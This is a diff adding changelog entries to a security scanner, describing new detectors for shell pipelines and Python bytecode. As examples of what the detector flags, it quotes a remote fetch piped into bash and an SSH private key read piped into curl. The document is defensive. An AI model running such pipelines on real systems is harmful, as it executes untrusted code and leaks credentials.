@@ -9,6 +9,26 @@ release process is formalized.
 
 ### Added
 
+**Shell-pipeline taint detector + HTML taint-flow visualization**
+- New native detector for source→sink flows through shell pipes:
+  `PIPELINE_FETCH_TO_SHELL` (a remote fetch piped into a shell interpreter,
+  `curl http://x | bash`) and `PIPELINE_SECRET_TO_NETWORK` (a secret /
+  credential read piped into a network egress, `cat ~/.ssh/id_rsa | curl
+  -X POST ...`). Stage roles are classified by the stage's first token, not
+  by substring, and a finding fires only when the source is strictly
+  upstream of the sink (`||` is never treated as a data pipe). Frozen
+  native IDs with positive + negative fixtures.
+- The `--format html` report now groups findings into collapsible
+  per-category correlation groups and renders pipeline findings as a
+  left-to-right taint-flow diagram (source → … → sink).
+
+**Operator threat-mapping (`--threat-mapping`)**
+- Overlay operator-defined taxonomy labels onto findings from a JSON or
+  YAML file mapping `rule_id` (or a `PREFIX*` glob) to label lists.
+  Surfaced under each finding's `user_taxonomy` in JSON output. The
+  extensible counterpart to the frozen built-in `taxonomy_tags` registry —
+  communication-only, never feeds verdict scoring.
+
 **Python bytecode (`.pyc`) integrity detector (native)**
 - New native detector emitting `BYTECODE_PYC_INVALID_MAGIC` (malformed /
   hand-crafted CPython header), `BYTECODE_PYC_SOURCELESS` (compiled
